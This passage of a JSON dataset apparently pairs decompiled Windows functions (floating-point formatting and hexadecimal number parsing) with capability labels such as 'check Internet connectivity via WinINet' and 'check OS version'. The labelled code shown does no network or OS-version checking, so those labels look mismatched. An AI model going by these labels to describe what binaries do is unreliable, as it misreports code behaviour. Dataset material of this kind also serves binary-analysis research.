uStack168 + uStack136;\n                        uVar21 = uStack120 - (uStack168 - 1);\n                        goto code_r0x00014001b063;\n                    }\n                    goto code_r0x00014001b8ac;\n                }\n                uStack156 = uStack156 + uStack76;\n                uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                uStack136 = uStack136 & 0xffffffff00000000 | uStack76 + uStack136;\n            }\n            else {\n                if (in_stack_00000028 < 2) {\n                    uStack156 = uStack156 + uStack76;\n                    uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                    uStack136 = uStack136 & 0xffffffff00000000 | uStack76 + uStack136;\n                    goto code_r0x00014001b063;\n                }\ncode_r0x00014001b700:\n                if (uStack120 < uStack168 - 1) {\ncode_r0x00014001b8ac:\n                    uStack192._0_4_ = uStack192 + ((uStack168 - 1) - uStack120);\n                    uStack156 = uStack156 + uStack168;\n                    uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                    uStack76 = uStack168;\n                    uStack136 = uStack136 & 0xffffffff00000000 | uStack168 + uStack136;\n                    uVar21 = 0;\n                    uStack120 = uStack168 - 1;\n                }\n                else {\n                    uVar21 = uStack120 - (uStack168 - 1);\n                    if (uStack168 < 0) {\n                        uStack76 = 0;\n                        uStack152 = uStack152 & 0xffffffff00000000 | uStack136 - uStack168;\n                    }\n                    else {\n                        uStack156 = uStack156 + uStack168;\n                        uStack76 = uStack168;\n                        uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                        uStack136 = uStack136 & 0xffffffff00000000 | uStack168 + uStack136;\n                    }\n                }\n            }\ncode_r0x00014001b063:\n            uStack256 = 0x14001b075;\n            uStack96 = uStack192;\n            iVar20 = fcn.14001d0d0(1);\n            iStack124 = 1;\n            uStack192._0_4_ = uStack96;\ncode_r0x00014001b088:\n            if ((0 < uStack152) && (0 < uStack156)) {\n                uStack76 = uStack156;\n                if (uStack152 <= uStack156) {\n                    uStack76 = uStack152;\n                }\n                uStack136 = uStack136 & 0xffffffff00000000 | uStack136 - uStack76;\n                uStack156 = uStack156 - uStack76;\n                uStack152 = uStack152 & 0xffffffff00000000 | uStack152 - uStack76;\n            }\n            uVar13 = uVar9;\n            if (uStack120 != 0) {\n                if ((iStack124 != 0) && (uVar21 != 0)) {\n                    uStack256 = 0x14001b94c;\n                    uStack96 = uStack192;\n                    iVar20 = fcn.14001d2f0(iVar20, uVar21);\n                    uStack256 = 0x14001b95a;\n                    uVar13 = fcn.14001d190(iVar20, uVar9);\n                    uStack256 = 0x14001b965;\n                    fcn.14001cfa0(uVar9);\n                    uStack120 = uStack120 - uVar21;\n                    uStack192._0_4_ = uStack96;\n                    if (uStack120 == 0) goto code_r0x00014001b0f4;\n                }\n                uStack256 = 0x14001b0e9;\n                uStack96 = uStack192;\n                uVar13 = fcn.14001d2f0(uVar13, uStack120);\n                uStack192._0_4_ = uStack96;\n            }\ncode_r0x00014001b0f4:\n            uStack256 = 0x14001b106;\n            uStack120 = uStack192;\n            arg1_00 = fcn.14001d0d0(1);\n            if (uStack120 == 0) {\n                uStack200._0_4_ = uStack120;\n                if (((in_stack_00000028 < 2) && (uVar6 == 1)) &&\n                   (bVar2 = arg1[1] + 1 < uStack200,  uStack200._0_4_ = uStack120,  bVar2)) {\n                    uStack136 = uStack136 & 0xffffffff00000000 | uStack136 + 1;\n                    uStack200._0_4_ = 1;\n                    uStack156 = uStack156 + 1;\n                }\n                uVar21 = 0x1f;\n            }\n            else {\n                uStack256 = 0x14001b68b;\n                arg1_00 = fcn.14001d2f0(arg1_00, uStack120);\n                if (((in_stack_00000028 < 2) && (uVar6 == 1)) && (arg1[1] + 1 < uStack200)) {\n                    uStack136 = uStack136 & 0xffffffff00000000 | uStack136 + 1;\n                    uStack200._0_4_ = 1;\n                    uStack156 = uStack156 + 1;\n                }\n                else {\n                    uStack200._0_4_ = 0;\n                }\n                puVar16 = arg1_00 + 0x18 + (*(arg1_00 + 0x14) + -1) * 4;\n                uVar21 = 0x1f;\n                if (*puVar16 != 0) {\n                    for (; *puVar16 >> uVar21 == 0; uVar21 = uVar21 - 1) {\n                    }\n                }\n                uVar21 = uVar21 ^ 0x1f;\n            }\n            uVar21 = (uVar21 - uStack156) - 4 & 0x1f;\n            uVar9 = uVar13;\n            uStack76 = uVar21;\n            if (0 < uStack136 + uVar21) {\n                uStack200 = uStack200 & 0xffffffff00000000 | uStack200;\n                uStack256 = 0x14001b162;\n                uStack136 = arg1_00;\n                uVar9 = fcn.14001d470(uVar13, uStack136 + uVar21);\n                arg1_00 = uStack136;\n            }\n            if (0 < uStack156 + uStack76) {\n                uStack200 = uStack200 & 0xffffffff00000000 | uStack200;\n                uStack256 = 0x14001b18f;\n                arg1_00 = fcn.14001d470(arg1_00, uStack156 + uStack76);\n            }\n            bVar2 = 2 < in_stack_00000028;\n            if (iStack116 == 0) {\ncode_r0x00014001b1ad:\n                if ((uStack168 < 1) && (bVar2)) {\ncode_r0x00014001b1c4:\n                    if (uStack168 == 0) {\n                        uStack256 = 0x14001b1de;\n                        uStack200 = fcn.14001d010(arg1_00, 5, 0);\n                        uStack256 = 0x14001b1ee;\n                        iVar8 = fcn.14001d580(uVar9, uStack200);\n                        arg1_00 = uStack200;\n                        if (0 < iVar8) {\n                            uStack136._0_4_ = uStack128 + 2;\n                            goto code_r0x00014001af0f;\n                        }\n                    }\n                    goto code_r0x00014001b22b;\n                }\n                uStack136._0_4_ = uStack128 + 1;\n                if (iStack124 != 0) {\ncode_r0x00014001b337:\n                    iVar10 = iVar20;\n                    if (0 < uStack152 + uVar21) {\n                        uStack200 = uStack200 & 0xffffffff00000000 | uStack200;\n                        uStack256 = 0x14001b354;\n                        uStack192 = arg1_00;\n                        iVar10 = fcn.14001d470(iVar20, uStack152 + uVar21);\n                        arg1_00 = uStack192;\n                    }\n                    uStack200 = arg1_00;\n                    iVar20 = iVar10;\n                    if (uStack200 != 0) {\n                        uStack256 = 0x14001bb35;\n                        iVar20 = fcn.14001ceb0(*(iVar10 + 8));\n                        uStack256 = 0x14001bb51;\n                        sub.msvcrt.dll_memcpy(iVar20 + 0x10, iVar10 + 0x10);\n                        uStack256 = 0x14001bb5e;\n                        iVar20 = fcn.14001d470(iVar20, 1);\n                    }\n                    uStack136 = uStack136 & 0xffffffff00000000 | uStack136;\n                    uStack76 = 1;\n                    uStack192 = uStack192 & 0xffffffff00000000 | in_stack_00000028;\n                    puVar14 = puStack144;\ncode_r0x00014001b432:\n                    uStack256 = 0x14001b446;\n                    iVar8 = fcn.14001a560(uVar9, uStack200);\n                    uVar21 = iVar8 + 0x30;\n                    uStack256 = 0x14001b457;\n                    uVar6 = fcn.14001d580(uVar9, iVar10);\n                    uStack256 = 0x14001b467;\n                    uVar13 = fcn.14001d5d0(uStack200, iVar20);\n                    if (*(uVar13 + 0x10) == 0) {\n                        uStack256 = 0x14001b484;\n                        uStack152 = uVar13;\n                        uStack156 = fcn.14001d580(uVar9, uVar13);\n                        uStack256 = 0x14001b492;\n                        fcn.14001cfa0(uStack152);\n                        puVar16 = uStack176;\n                        uVar15 = uStack156;\n                        if (((uStack156 | uStack192) != 0) ||\n                           (uVar15 = uStack156 | uStack192,  (*arg3 & 1 | uStack160) != 0)) goto code_r0x00014001b39d;\n                        if (uVar21 != 0x39) {\n                            if (uVar6 < 1) {\n                                uStack176 = CONCAT44(uStack176._4_4_, 0x10);\n                                if (*(uVar9 + 0x14) < 2) {\n                                    uStack176 = puVar16 & 0xffffffff00000000 | (*(uVar9 + 0x18) != 0) << 4;\n                                }\n                            }\n                            else {\n                                uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n                                uVar21 = iVar8 + 0x31;\n                            }\n                            *puVar14 = uVar21;\n                            puVar16 = puVar14 + 1;\n                            arg1_00 = uStack200;\n                            goto code_r0x00014001b4f0;\n                        }\ncode_r0x00014001bc59:\n                        puVar16 = puVar14 + 1;\n                        arg1_00 = uStack200;\n                        goto code_r0x00014001bc5d;\n                    }\n                    uStack256 = 0x14001b398;\n                    fcn.14001cfa0(uVar13);\n                    uVar15 = 1;\ncode_r0x00014001b39d:\n                    arg1_00 = uStack200;\n                    if ((uVar6 < 0) || (((uVar6 | uStack192) == 0 && ((*arg3 & 1) == 0)))) {\n                        if (uStack160 != 0) {\n                            if ((*(uVar9 + 0x14) < 2) && (*(uVar9 + 0x18) == 0)) {\n                                if (0 < uVar15) goto code_r0x00014001bbe3;\n                                puVar16 = puVar14 + 1;\n                                goto code_r0x00014001bac2;\n                            }\n                            if (uStack160 == 2) goto code_r0x00014001bc42;\n                            uStack200 = uStack200 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                            while( true ) {\n                                puVar16 = puVar14 + 1;\n                                uStack256 = 0x14001ba95;\n                                iVar8 = fcn.14001d580(arg1_00, iVar20);\n                                if (iVar8 < 1) break;\n                                *puVar14 = uVar21;\n                                uStack256 = 0x14001ba58;\n                                iVar11 = fcn.14001d010(iVar20, 10, 0);\n                                if (iVar10 == iVar20) {\n                                    iVar10 = iVar11;\n                                }\n                                uStack256 = 0x14001ba72;\n                                uVar9 = fcn.14001d010(uVar9, 10, 0);\n                                uStack256 = 0x14001ba83;\n                                iVar8 = fcn.14001a560(uVar9, arg1_00);\n                                uVar21 = iVar8 + 0x30;\n                                iVar20 = iVar11;\n                                puVar14 = puVar16;\n                            }\n                            uStack136._0_4_ = uStack200;\n                            if (uVar21 == 0x39) {\ncode_r0x00014001bc5d:\n                                *puVar14 = 0x39;\n                                puVar17 = puStack144;\n                                puVar14 = puVar16;\n                                goto code_r0x00014001b879;\n                            }\n                            uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n                            uVar21 = uVar21 + 1;\ncode_r0x00014001bac2:\n                            *puVar14 = uVar21;\n                            goto code_r0x00014001b4f0;\n                        }\n                        if (0 < uVar15) {\ncode_r0x00014001bbe3:\n                            uStack192 = uStack192 & 0xffffffff00000000 | uVar21;\n                            uStack256 = 0x14001bbff;\n                            uStack176 = puVar14;\n                            uVar9 = fcn.14001d470(uVar9, 1);\n                            uStack256 = 0x14001bc0f;\n                            iVar7 = fcn.14001d580(uVar9, uStack200);\n                            puVar14 = uStack176;\n                            if ((iVar7 < 1) && ((iVar7 != 0 || ((uStack192 & 1) == 0)))) {\n                                uStack160 = 0x20;\n                                uVar21 = uStack192;\n                            }\n                            else {\n                                if (uStack192 == 0x39) goto code_r0x00014001bc59;\n                                uStack160 = 0x20;\n                                uVar21 = iVar8 + 0x31;\n                            }\n                        }\n                        if (*(uVar9 + 0x14) < 2) {\n                            if (*(uVar9 + 0x18) == 0) {\n                                puVar16 = puVar14 + 1;\n                                uStack176 = uStack176 & 0xffffffff00000000 | uStack160;\n                                arg1_00 = uStack200;\n                                goto code_r0x00014001bac2;\n                            }\n                        }\n                        else {\ncode_r0x00014001bc42:\n                        }\n                        uStack176 = CONCAT44(uStack176._4_4_, 0x10);\n                        puVar16 = puVar14 + 1;\n                        arg1_00 = uStack200;\n                        goto code_r0x00014001bac2;\n                    }\n                    puVar16 = puVar14 + 1;\n                    if ((0 < uVar15) && (uStack160 != 2)) {\n                        if (uVar21 == 0x39) goto code_r0x00014001bc5d;\n                        uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n                        *puVar14 = uVar21 + 1;\n                        goto code_r0x00014001b4f0;\n                    }\n                    *puVar14 = uVar21;\n                    if (uStack76 != uStack168) goto code_r0x00014001b3e3;\n                    goto code_r0x00014001b629;\n                }\n            }\n            else {\n                uStack256 = 0x14001b555;\n                uStack200 = arg1_00;\n                uStack156 = uStack200;\n                iVar8 = fcn.14001d580(uVar9, arg1_00);\n                arg1_00 = uStack200;\n                uStack200._0_4_ = uStack156;\n                if (-1 < iVar8) goto code_r0x00014001b1ad;\n                uStack168 = uStack200;\n                uStack200 = uStack200 & 0xffffffff00000000 | uStack156;\n                uVar6 = uStack128 - 1;\n                uStack256 = 0x14001b589;\n                uVar9 = fcn.14001d010(uVar9, 10, 0);\n                arg1_00 = uStack168;\n                bVar3 = 0 < uStack92;\n                if (iStack124 != 0) {\n                    uStack256 = 0x14001bd60;\n                    iVar20 = fcn.14001d010(iVar20, 10, 0);\n                    arg1_00 = uStack168;\n                    if (!bVar2 || bVar3) {\n                        uStack168 = uStack168 & 0xffffffff00000000 | uStack92;\n                        uStack136._0_4_ = uStack128;\n                        goto code_r0x00014001b337;\n                    }\ncode_r0x00014001bc84:\n                    arg1_00 = uStack168;\n                    uStack168 = uStack168 & 0xffffffff00000000 | uStack92;\n                    uStack128 = uVar6;\n                    goto code_r0x00014001b1c4;\n                }\n                if (bVar2 && !bVar3) goto code_r0x00014001bc84;\n                uStack168 = uStack168 & 0xffffffff00000000 | uStack92;\n                uStack136._0_4_ = uStack128;\n            }\n            uStack76 = 1;\n            puVar14 = puStack144;\n            while( true ) {\n                puVar16 = puVar14 + 1;\n                uStack256 = 0x14001b613;\n                iVar8 = fcn.14001a560(uVar9, arg1_00);\n                uVar21 = iVar8 + 0x30;\n                *puVar14 = uVar21;\n                if (uStack168 <= uStack76) break;\n                uStack256 = 0x14001b5f0;\n                uVar9 = fcn.14001d010(uVar9, 10, 0);\n                uStack76 = uStack76 + 1;\n                puVar14 = puVar16;\n            }\n            iVar10 = 0;\ncode_r0x00014001b629:\n            if (uStack160 == 0) {\n                uStack192 = uStack192 & 0xffffffff00000000 | uVar21;\n                uStack256 = 0x14001b9a9;\n                uStack200 = arg1_00;\n                uVar9 = fcn.14001d470(uVar9, 1);\n                uStack256 = 0x14001b9b9;\n                iVar8 = fcn.14001d580(uVar9, uStack200);\n                puVar17 = puStack144;\n                arg1_00 = uStack200;\n                puVar14 = puVar16;\n                if ((iVar8 < 1) && ((iVar8 != 0 || ((uStack192 & 1) == 0)))) goto code_r0x00014001b9d7;\ncode_r0x00014001b879:\n                do {\n                    puVar16 = puVar14;\n                    puVar14 = puVar16 + -1;\n                    if (*(puVar16 + -1) != 0x39) {\n                        uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n                        *puVar14 = *(puVar16 + -1) + 1;\n                        goto code_r0x00014001b4f0;\n                    }\n                } while (puVar17 != puVar14);\n                uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n                uStack136._0_4_ = uStack136 + 1;\n                *puStack144 = 0x31;\n            }\n            else {\n                if (uStack160 == 2) {\ncode_r0x00014001b9d7:\n                    uStack176 = CONCAT44(uStack176._4_4_, 0x10);\n                    puVar14 = puVar16;\n                    if (*(uVar9 + 0x14) < 2) {\n                        iVar8 = *(uVar9 + 0x18);\n                        goto code_r0x00014001b655;\n                    }\n                }\n                else {\n                    puVar17 = puStack144;\n                    puVar14 = puVar16;\n                    if ((1 < *(uVar9 + 0x14)) || (iVar8 = *(uVar9 + 0x18),  iVar8 != 0)) goto code_r0x00014001b879;\ncode_r0x00014001b655:\n                    uStack176 = uStack176 & 0xffffffff00000000 | (iVar8 != 0) << 4;\n                    puVar14 = puVar16;\n                }\n                do {\n                    puVar16 = puVar14;\n                    puVar14 = puVar16 + -1;\n                } while (*(puVar16 + -1) == 0x30);\n            }\ncode_r0x00014001b4f0:\n            uStack256 = 0x14001b4f8;\n            fcn.14001cfa0(arg1_00);\n            puVar17 = puStack144;\n            if (iVar20 == 0) goto code_r0x00014001af35;\n            if ((iVar10 != 0) && (iVar10 != iVar20)) {\n                uStack256 = 0x14001b513;\n                fcn.14001cfa0(iVar10);\n                puVar17 = puStack144;\n            }\n        }\n        puStack144 = puVar16;\n        uStack256 = 0x14001af35;\n        fcn.14001cfa0(iVar20);\n        puVar16 = puStack144;\ncode_r0x00014001af35:\n        puStack144 = puVar16;\n        uStack256 = 0x14001af3d;\n        fcn.14001cfa0(uVar9);\n        *puStack144 = 0;\n        *puStack216 = uStack136;\n        if (ppuStack208 != NULL) {\n            *ppuStack208 = puStack144;\n        }\n        *puStack184 = *puStack184 | uStack176;\n        return puVar17;\n    }\n    uStack256 = 0x14001a9e8;\n    fcn.14001cfa0(uVar9);\ncode_r0x00014001a9e8:\n    uVar21 = 1;\n    pcVar12 = 0x14010fa3d;\n    *puStack216 = 1;\n    *0x20 = &stack0xffffffffffffff00;\n    uStack256 = 0x14001aa0a;\n    unaff_RBX = uVar9;\n    unaff_RSI = arg3;\n    unaff_RDI = in_stack_00000028;\ncode_r0x00014001a4b0:\n    *(*0x20 + -8) = unaff_RDI;\n    *(*0x20 + -0x10) = unaff_RSI;\n    *(*0x20 + -0x18) = unaff_RBX;\n    if (uVar21 < 0x1c) {\n        uVar6 = 0;\n    }\n    else {\n        iVar8 = 4;\n        uVar6 = 0;\n        do {\n            iVar8 = iVar8 * 2;\n            uVar6 = uVar6 + 1;\n        } while (iVar8 + 0x17 < uVar21);\n    }\n    *(*0x20 + -0x40) = 0x14001a4e4;\n    puVar14 = fcn.14001ceb0(uVar6);\n    *puVar14 = uVar6;\n    uVar18 = *pcVar12;\n    *(puVar14 + 1) = uVar18;\n    puVar16 = puVar14 + 1;\n    while (uVar18 != 0) {\n        pcVar12 = pcVar12 + 1;\n        uVar18 = *pcVar12;\n        puVar16 = puVar16 + 1;\n        *puVar16 = uVar18;\n    }\n    if (ppuStack208 != NULL) {\n        *ppuStack208 = puVar16;\n    }\n    return puVar14 + 1;\n}\n",
        "token_count": 12085
    },
    "14001bec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint8_t fcn.14001bec0(uint8_t **arg1, uint32_t *arg2, uint32_t *arg3, int64_t *arg4)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint8_t *puVar4;\n    bool bVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint8_t **ppuVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    uint8_t *puVar12;\n    uint8_t *puVar13;\n    int64_t iVar14;\n    uint *puVar15;\n    uint64_t uVar16;\n    uint32_t *puVar17;\n    uint8_t uVar18;\n    uint32_t uVar19;\n    uint8_t *puVar20;\n    uint32_t uVar21;\n    int32_t iVar22;\n    uint8_t *puVar23;\n    uint32_t *puVar24;\n    bool bVar25;\n    uint32_t in_stack_00000028;\n    \n    ppuVar9 = sub.msvcrt.dll_localeconv();\n    iVar10 = *0x140110850;\n    puVar4 = *ppuVar9;\n    if (*(*0x140110850 + 0x30) == '\\0') {\n        fcn.14001c8f0();\n    }\n    *arg4 = 0;\n    puVar23 = *arg1;\n    uVar18 = puVar23[2];\n    if (uVar18 == 0x30) {\n        puVar13 = puVar23 + 3;\n        do {\n            puVar12 = puVar13;\n            uVar18 = *puVar12;\n            puVar13 = puVar12 + 1;\n        } while (uVar18 == 0x30);\n        iVar6 = (puVar12 - (puVar23 + 3)) + 1;\n    }\n    else {\n        puVar12 = puVar23 + 2;\n        iVar6 = 0;\n    }\n    uVar2 = *puVar4;\n    puVar23 = puVar12;\n    if (*(iVar10 + uVar18) == '\\0') {\n        iVar14 = 0;\n        puVar13 = puVar12;\n        uVar3 = uVar2;\n        if (uVar2 != 0) {\n            do {\n                if (puVar12[iVar14] != uVar3) goto code_r0x00014001bf73;\n                iVar14 = iVar14 + 1;\n                uVar3 = puVar4[iVar14];\n            } while (uVar3 != 0);\n            puVar13 = puVar12 + iVar14;\n            uVar18 = *puVar13;\n            if (*(iVar10 + uVar18) != '\\0') {\n                puVar12 = puVar13;\n                if (uVar18 != 0x30) {\n                    bVar25 = false;\ncode_r0x00014001c371:\n                    iVar6 = 1;\n                    puVar23 = puVar12;\n                    goto code_r0x00014001c0a0;\n                }\n                do {\n                    uVar18 = puVar12[1];\n                    puVar12 = puVar12 + 1;\n                } while (uVar18 == 0x30);\n                bVar25 = *(iVar10 + uVar18) == '\\0';\n                if (!bVar25) goto code_r0x00014001c371;\n                iVar6 = 1;\n                puVar23 = puVar12;\n                if (uVar18 == uVar2) goto code_r0x00014001c199;\n                goto code_r0x00014001c0b7;\n            }\n        }\ncode_r0x00014001bf73:\n        uVar19 = 0;\n        bVar25 = true;\n        if ((uVar18 & 0xdf) == 0x50) goto code_r0x00014001c1b8;\n        bVar25 = true;\n        uVar19 = 0;\n        uVar7 = 0;\n        bVar5 = false;\n        puVar12 = puVar13;\ncode_r0x00014001bf9a:\n        puVar20 = puVar13;\n        if (iVar6 == 0) {\n            puVar12 = puVar23 + -1;\n        }\ncode_r0x00014001bfa5:\n        *arg1 = puVar12;\n        if (bVar25) {\n            return 0;\n        }\n        if (bVar5) {\n            uVar19 = arg2[3];\n            if (uVar7 != 0) {\n                if (uVar19 == 2) {\n                    if (in_stack_00000028 != 0) goto code_r0x00014001c425;\n                }\n                else if ((uVar19 != 3) || (in_stack_00000028 == 0)) goto code_r0x00014001c425;\n                iVar14 = fcn.14001ceb0(0);\n                *(iVar14 + 0x14) = 0x100000001;\n                uVar7 = arg2[1];\n                goto code_r0x00014001c3c0;\n            }\n            if (uVar19 == 2) {\n                if (in_stack_00000028 != 0) goto code_r0x00014001bfe4;\n            }\n            else if (uVar19 == 3) {\n                if (in_stack_00000028 == 0) {\ncode_r0x00014001bfe4:\n                    uVar19 = *arg2 & 0x1f;\n                    uVar21 = *arg2 >> 5;\n                    iVar22 = (uVar21 + 1) - (uVar19 == 0);\n                    uVar16 = 0;\n                    iVar6 = iVar22;\n                    while (iVar6 = iVar6 >> 1,  iVar6 != 0) {\n                        uVar16 = uVar16 + 1;\n                    }\n                    iVar10 = fcn.14001ceb0(uVar16);\n                    *arg4 = iVar10;\n                    *(iVar10 + 0x14) = iVar22;\n                    if (0 < uVar21) {\n                        sub.msvcrt.dll_memset(iVar10 + 0x18, 0xff, uVar21 * 4);\n                        uVar7 = uVar21;\n                    }\n                    if (uVar21 < iVar22) {\n                        *(iVar10 + 0x18 + uVar7 * 4) = 0x20 >> (-uVar19 & 0x1fU);\n                    }\n                    *arg3 = arg2[1];\n                    return 0x11;\n                }\n            }\n            else if (uVar19 != 1) goto code_r0x00014001bfe4;\n            goto code_r0x00014001c4b8;\n        }\n    }\n    else {\n        iVar6 = iVar6 + 1;\n        bVar25 = false;\n        puVar13 = NULL;\ncode_r0x00014001c0a0:\n        do {\n            puVar20 = puVar12 + 1;\n            puVar12 = puVar12 + 1;\n        } while (*(iVar10 + *puVar20) != '\\0');\n        if (*puVar20 == uVar2) {\n            if (puVar13 == NULL) {\n                iVar14 = 1;\n                uVar18 = puVar4[1];\n                while (uVar18 != 0) {\n                    if (puVar12[iVar14] != uVar18) {\n                        if ((*puVar12 & 0xdf) == 0x50) {\n                            uVar19 = 0;\n                            puVar13 = puVar12;\n                            goto code_r0x00014001c1b8;\n                        }\n                        uVar19 = 0;\n                        uVar7 = 0;\n                        bVar5 = false;\n                        puVar20 = puVar12;\n                        goto code_r0x00014001bfa5;\n                    }\n                    iVar14 = iVar14 + 1;\n                    uVar18 = puVar4[iVar14];\n                }\n                puVar13 = puVar12 + iVar14;\n                uVar18 = *puVar13;\n                puVar12 = puVar13;\n                if (*(iVar10 + uVar18) != '\\0') {\n                    do {\n                        uVar18 = puVar12[1];\n                        puVar12 = puVar12 + 1;\n                    } while (*(iVar10 + uVar18) != '\\0');\n                    goto code_r0x00014001c0c2;\n                }\n                uVar19 = 0;\n                puVar20 = puVar13;\n            }\n            else {\ncode_r0x00014001c199:\n                uVar18 = *puVar12;\n                uVar19 = (puVar13 - puVar12) * 4;\n                puVar20 = puVar12;\n            }\n        }\n        else {\ncode_r0x00014001c0b7:\n            uVar18 = *puVar12;\n            uVar19 = 0;\n            puVar20 = puVar12;\n            if (puVar13 != NULL) {\ncode_r0x00014001c0c2:\n                uVar19 = (puVar13 - puVar12) * 4;\n                puVar20 = puVar12;\n            }\n        }\n        puVar13 = puVar20;\n        if ((uVar18 & 0xdf) == 0x50) {\ncode_r0x00014001c1b8:\n            uVar18 = puVar13[1];\n            if (uVar18 == 0x2b) {\n                uVar7 = 0;\ncode_r0x00014001c306:\n                uVar18 = puVar13[2];\n                puVar20 = puVar13 + 2;\n            }\n            else {\n                if (uVar18 == 0x2d) {\n                    uVar7 = 1;\n                    goto code_r0x00014001c306;\n                }\n                puVar20 = puVar13 + 1;\n                uVar7 = 0;\n            }\n            bVar5 = false;\n            puVar12 = puVar13;\n            if (*(iVar10 + uVar18) - 1 < 0x19) {\n                uVar21 = *(iVar10 + uVar18) - 0x10;\n                uVar18 = puVar20[1];\n                while( true ) {\n                    uVar16 = uVar18;\n                    puVar12 = puVar20 + 1;\n                    if (0x18 < *(iVar10 + uVar16) - 1) break;\n                    if (0x7ffffff < uVar21) {\n                        bVar5 = true;\n                    }\n                    uVar18 = puVar20[2];\n                    uVar21 = (*(iVar10 + uVar16) - 0x10) + uVar21 * 10;\n                    puVar20 = puVar12;\n                }\n                if (uVar7 != 0) {\n                    uVar21 = -uVar21;\n                }\n                uVar19 = uVar19 + uVar21;\n            }\n            goto code_r0x00014001bf9a;\n        }\n        *arg1 = puVar20;\n        if (bVar25) {\n            return 0;\n        }\n    }\n    uVar16 = 0;\n    for (iVar6 = (puVar20 - puVar23) + -1; 7 < iVar6; iVar6 = iVar6 >> 1) {\n        uVar16 = uVar16 + 1;\n    }\n    iVar14 = fcn.14001ceb0(uVar16);\n    puVar24 = iVar14 + 0x18;\n    if (puVar4[1] == 0) {\n        iVar11 = 0;\n    }\n    else {\n        iVar11 = sub.msvcrt.dll_strlen();\n        iVar11 = iVar11 + 1;\n    }\n    puVar17 = puVar24;\n    if (puVar23 < puVar20) {\n        uVar21 = 0;\n        iVar6 = 0;\n        do {\n            while( true ) {\n                uVar18 = puVar20[-1];\n                puVar12 = puVar20 + -1;\n                if (uVar18 == puVar4[iVar11]) break;\n                if (iVar6 == 0x20) {\n                    *puVar17 = uVar21;\n                    iVar22 = 4;\n                    uVar18 = puVar20[-1];\n                    uVar21 = 0;\n                    puVar17 = puVar17 + 1;\n                    iVar6 = 0;\n                }\n                else {\n                    iVar22 = iVar6 + 4;\n                }\n                uVar21 = uVar21 | (*(iVar10 + uVar18) & 0xf) << (iVar6 & 0x1f);\n                puVar20 = puVar12;\n                iVar6 = iVar22;\n                if (puVar12 <= puVar23) goto code_r0x00014001c257;\n            }\n            puVar20 = puVar12 + -iVar11;\n        } while (puVar23 < puVar20);\ncode_r0x00014001c257:\n        uVar7 = 0x1f;\n        if (uVar21 != 0) {\n            for (; uVar21 >> uVar7 == 0; uVar7 = uVar7 - 1) {\n            }\n        }\n        uVar7 = uVar7 ^ 0x1f;\n    }\n    else {\n        uVar7 = 0x20;\n        uVar21 = 0;\n    }\n    *puVar17 = uVar21;\n    uVar21 = *arg2;\n    iVar6 = puVar17 + (4 - puVar24) >> 2;\n    *(iVar14 + 0x14) = iVar6;\n    iVar6 = iVar6 * 0x20 - uVar7;\n    if (uVar21 < iVar6) {\n        uVar7 = iVar6 - uVar21;\n        uVar8 = fcn.14001dc40(iVar14, uVar7);\n        if (uVar8 != 0) {\n            uVar1 = uVar7 - 1;\n            uVar8 = 1;\n            if ((1 << (uVar1 & 0x1f) & puVar24[uVar1 >> 5]) != 0) {\n                if ((uVar1 == 0) || (iVar6 = fcn.14001dc40(iVar14, uVar1),  iVar6 == 0)) {\n                    uVar8 = 2;\n                }\n                else {\n                    uVar8 = 3;\n                }\n            }\n        }\n        uVar19 = uVar19 + uVar7;\n        fcn.14001c7b0(iVar14, uVar7);\n    }\n    else {\n        uVar8 = 0;\n        if (iVar6 < uVar21) {\n            uVar19 = uVar19 - (uVar21 - iVar6);\n            iVar14 = fcn.14001d470(iVar14, uVar21 - iVar6);\n            puVar24 = iVar14 + 0x18;\n        }\n    }\n    if (arg2[2] < uVar19) {\ncode_r0x00014001c4b0:\n        fcn.14001cfa0(iVar14);\ncode_r0x00014001c4b8:\n        puVar15 = sub.msvcrt.dll__errno();\n        *puVar15 = 0x22;\n        return 0xa3;\n    }\n    uVar7 = arg2[1];\n    if (uVar19 < uVar7) {\n        uVar19 = uVar7 - uVar19;\n        if (uVar21 <= uVar19) {\n            uVar8 = arg2[3];\n            if (uVar8 == 2) {\n                if (in_stack_00000028 == 0) goto code_r0x00014001c65d;\n            }\n            else if (uVar8 == 3) {\n                if (in_stack_00000028 != 0) goto code_r0x00014001c65d;\n            }\n            else if ((uVar8 == 1) && (uVar21 == uVar19)) {\n                if (uVar21 != 1) {\n                    iVar6 = fcn.14001dc40(iVar14, uVar21 - 1);\n                    if (iVar6 == 0) goto code_r0x00014001c41d;\n                    uVar7 = arg2[1];\n                }\ncode_r0x00014001c65d:\n                *(iVar14 + 0x14) = 1;\n                *puVar24 = 1;\ncode_r0x00014001c3c0:\n                *arg4 = iVar14;\n                *arg3 = uVar7;\n                puVar15 = sub.msvcrt.dll__errno();\n                *puVar15 = 0x22;\n                return 0x62;\n            }\ncode_r0x00014001c41d:\n            fcn.14001cfa0(iVar14);\ncode_r0x00014001c425:\n            puVar15 = sub.msvcrt.dll__errno();\n            *puVar15 = 0x22;\n            return 0x50;\n        }\n        uVar7 = uVar19 - 1;\n        if (uVar8 == 0) {\n            if (uVar7 != 0) {\n                uVar8 = fcn.14001dc40(iVar14, uVar7);\n            }\n        }\n        else {\n            uVar8 = 1;\n        }\n        if ((1 << (uVar7 & 0x1f) & puVar24[uVar7 >> 5]) != 0) {\n            uVar8 = uVar8 | 2;\n        }\n        uVar21 = uVar21 - uVar19;\n        uVar18 = 2;\n        fcn.14001c7b0(iVar14, uVar19);\n        uVar19 = arg2[1];\n    }\n    else {\n        uVar18 = 1;\n    }\n    if (uVar8 == 0) goto 